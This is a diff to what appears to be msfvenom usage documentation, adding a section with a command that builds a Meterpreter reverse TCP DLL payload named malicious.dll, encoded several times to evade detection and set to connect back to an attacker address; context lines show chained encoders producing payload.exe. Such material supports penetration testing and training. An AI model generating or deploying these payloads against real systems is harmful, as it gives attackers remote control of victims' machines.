@@ -55,6 +55,13 @@ The -b flag is meant to be used to avoid certain characters in the payload. When
 
 `
 
+# How to generate a dll with msfvenom
+This command uses `msfvenom` to create a DLL payload that establishes a reverse TCP connection to the specified attacker's IP and port.
+
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.6 LPORT=4444 -f dll -e x64/shikata_ga_nai -i 5 -o malicious.dll
+```
+
 # How to generate a payload
 
 To generate a payload, there are two flags that you must supply (-p and -f):
@@ -114,4 +121,6 @@ Syntax example:
 ./msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | \
 ./msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
 `
+
+
 
